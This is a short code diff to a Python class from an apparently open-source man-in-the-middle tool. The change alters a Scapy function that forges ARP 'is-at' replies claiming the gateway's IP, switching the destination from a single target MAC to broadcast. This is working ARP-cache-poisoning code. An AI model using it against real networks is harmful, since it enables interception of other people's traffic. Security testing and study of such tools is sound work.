@@ -61,10 +61,10 @@ class Fern_MITM_Class:
 
         def ARP_Is_At(self,ip_address,target_mac_address):
             '''Poisons Cache with fake target mac address'''
-            ethernet = Ether(dst = target_mac_address,src = self._local_mac)
+            ethernet = Ether(dst = 'ff:ff:ff:ff:ff:ff',src = self._local_mac)
             arp_packet = ARP(hwtype = 0x1,ptype = 0x800,hwlen = 0x6,plen = 0x4,
             op = "is-at",hwsrc = self._local_mac,psrc = self.gateway_IP_address,hwdst =
-            target_mac_address,pdst = ip_address)
+            'ff:ff:ff:ff:ff:ff',pdst = ip_address)
             padding_packet = Padding(load = "\x00"*18)
             ARP_is_at_packet = ethernet/arp_packet/padding_packet
             return(ARP_is_at_packet)
